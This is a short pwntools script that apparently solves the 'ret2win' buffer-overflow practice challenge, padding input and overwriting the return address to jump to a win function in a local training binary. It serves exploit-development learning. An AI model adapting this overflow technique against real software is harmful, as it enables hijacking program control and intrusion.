from pwn import *
import sys

if len(sys.argv) == 2:
    r = gdb.debug(['./ret2win'], '''
    b *0x400755
    ''')
else:
    r = process('./ret2win')


ret_addr = 0x4006e7
ret2win_addr = 0x400756
payload = 'A' * cyclic_find('kaaalaaa') + p64(ret_addr) + p64(ret2win_addr)
r.sendline(payload)

r.interactive()

